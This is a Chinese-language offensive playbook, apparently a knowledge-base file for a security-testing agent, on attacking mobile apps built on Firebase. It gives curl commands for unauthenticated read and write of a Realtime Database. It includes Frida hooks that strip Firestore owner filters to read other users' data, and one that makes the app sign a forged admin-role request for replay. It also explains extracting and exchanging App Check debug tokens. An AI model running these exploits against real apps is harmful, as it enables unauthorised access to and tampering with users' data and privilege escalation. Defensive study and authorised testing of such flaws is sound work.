# Firebase 移动后端攻击面

> Android/iOS app 使用 Firebase 后端（RTDB/Firestore/App Check/Cloud Functions）时的攻击面检查与利用。
> 触发条件：反编译代码出现 `com.google.firebase` / `firebaseio.com` / `cloudfunctions.net`，或 APK 内含 `google-services.json`。

---

## 1. 攻击面总览

| 组件 | 识别特征 | 典型漏洞 |
|------|---------|---------|
| Realtime Database (RTDB) | `https://<proj>.firebaseio.com` / `xyz.firebaseio.com` | 规则未设 → 任意读写整棵 JSON 树 |
| Firestore | `firestore.googleapis.com`，SDK `FirebaseFirestore` | 客户端过滤（whereField）代替服务端规则 → 越权读 |
| App Check | `FirebaseAppCheck` / `getAppCheckToken` | debug token 泄露在发布包 → 伪设备通过校验 |
| Cloud Functions | `getHttpsCallable("<fn>")` / `cloudfunctions.net` | 函数信任客户端构造的 payload |
| Firebase Auth | `FirebaseAuth`（含匿名认证） | 匿名认证开放 → 任意人拿到合法 token 访问后端 |

## 2. 检查流程

```
1. 提取配置: unzip app.apk → res/raw/google-services.json（含 project_id、API key、app id）
   jadx 反编译 grep: "firebaseio.com" / "firestore" / "getHttpsCallable" / "FirebaseAppCheck"
2. RTDB 未授权测试（无需任何凭证）:
   curl https://<proj>-default-rtdb.firebaseio.com/.json          → 200 + 数据 = 全开放
   curl -X PUT .../users/<uid>.json -d '{"x":1}'                  → 写入成功 = 可篡改
3. Auth 检查: 代码是否用 signInAnonymously() → 是则先拿匿名 token 再测 RTDB/Firestore
   curl https://<proj>.firebaseio.com/.json?auth=<idToken>
4. Firestore: 客户端 whereField 过滤 = 危险信号（见 §3）
5. App Check: 检查 getDebugToken() / 二进制内 debug token 字符串（见 §4）
```

## 3. Firestore 客户端过滤绕过（越权读）

**漏洞模式**：app 用 `queryWhereField:@"userId" isEqualTo:<自己的uid>` + `whereField:@"isArchived" isEqualTo:@0` 过滤数据，后端 `firestore.rules` 未做同等强制——过滤只发生在客户端。

**利用（Frida hook 查询构造）**：replace `FIRQuery queryWhereField:isEqualTo:`（ObjC 层）：

- 字段名命中 `userId/ownerId/uid/user_id/owner_id/createdBy` 等属主过滤 → 直接 `return receiver`（跳过该 where 子句，查询不再限定属主）
- 字段名命中 `isArchived/archived/isDeleted` → 值强制替换为 `NSNumber numberWithBool:YES`（读出归档/隐藏数据）
- 其余字段透传原值

```javascript
// FIRQuery hook 骨架（完整 NativeCallback 四参签名: receiver, selector, fieldArg, valueArg）
var originalFn = new NativeFunction(originalImp, 'pointer',
    ['pointer', 'pointer', 'pointer', 'pointer']);
var replacement = new NativeCallback(function(receiver, selector, fieldArg, valueArg) {
    var fieldName = new ObjC.Object(fieldArg).toString().toLowerCase();
    if (['userid','ownerid','uid','user_id','owner_id','createdby'].indexOf(fieldName) !== -1) {
        return receiver;  // 丢弃属主过滤 → 查询覆盖全部用户
    }
    if (['isarchived','archived','isdeleted','deleted'].indexOf(fieldName) !== -1) {
        return originalFn(receiver, selector, fieldArg, ObjC.classes.NSNumber.numberWithBool_(1));
    }
    return originalFn(receiver, selector, fieldArg, valueArg);
}, 'pointer', ['pointer', 'pointer', 'pointer', 'pointer']);
Interceptor.replace(originalImp, replacement);
```

**判定成功的标志**：snapshot listener 回调收到非当前用户/已归档的文档。

## 4. App Check debug token 提取与兑换

**背景**：App Check 要求请求携带 attestation token。调试构建用固定的 debug token，`getDebugToken()` 的值若留在发布 APK 内，任何人可冒充可信客户端。

**检查**：
1. jadx/strings 搜 `getDebugToken`、App Check 相关调用
2. debug token 常嵌在 native lib（`strings lib/*/lib*.so | grep -E '^[A-Za-z0-9_-]{20,}$'`）或资源文件
3. 兑换：调 Firebase App Check API（`firebaseappcheck.googleapis.com`）用 debug token 换真实 App Check token，之后正常携带访问受保护后端

## 5. 自定义签名 API 的运行时伪造（借鸡生蛋签名）

**场景**：app 对请求做客户端签名（native 函数算 HMAC/RSA/自定义混合算法），服务端只验签。逐字节静态重写算法慢且易错。

**利用**：不逆算法，hook JNI 边界的签名方法，**替换入参 body 后调原实现**——app 自己的密钥给伪造 body 正确签名：

```javascript
Java.perform(function () {
    var Act = Java.use("com.target.MainActivity");   // 持有 native 签名方法的类
    Act.computeSignature.implementation = function (method, path, body) {
        var forged = '{"username":"admin","role":"admin"}';  // UI 永远发不出的 payload
        var sig = this.computeSignature(method, path, forged);
        console.log("[+] forged sig: " + sig);
        return sig;
    };
});
```

从 app 自身 UI 触发请求 → hook 换 body → native 层正常签名 → Burp 拿到签名后的请求直接 replay。

**适用边界**：签名函数输入包含 body 且密钥/逻辑全在客户端。若签名含服务器下发 nonce 且一次性，需配合时间窗内重放。

## 6. Cloud Functions 直调

代码出现 `getHttpsCallable("validateX")` 时，认证后可用 Frida 构造任意 payload（uid+值+时间戳）直调函数——函数侧若信任客户端字段即沦陷。与 `$AGENT_DIR/knowledge-base/mobile-patterns.md` "动态三式"配合使用。

## 7. 关联文件

- `$AGENT_DIR/knowledge-base/mobile-patterns.md` — Firebase Cloud Functions 直调（动态三式）
- `$AGENT_DIR/knowledge-base/mobile-frida.md` — Frida hook 基础与环境
